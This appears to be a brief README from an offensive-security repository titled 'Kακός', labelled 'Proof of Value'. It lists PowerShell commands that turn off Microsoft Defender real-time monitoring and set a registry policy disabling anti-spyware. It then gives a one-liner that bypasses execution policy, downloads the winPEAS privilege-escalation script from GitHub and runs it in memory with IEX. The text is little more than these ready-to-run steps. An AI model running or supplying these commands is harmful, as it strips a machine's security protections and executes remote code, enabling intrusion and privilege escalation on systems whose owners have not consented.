# Kακός
Proof of Value

Disable Microsoft Defender

Set-MpPreference -DisableRealtimeMonitoring $true
New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force



1. Executing that script immediately.
2. Downloading the winPEAS.ps1 script from its GitHub repository.
   
powershell -Exec ByPass -NoProfile -c "(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1') | IEX"
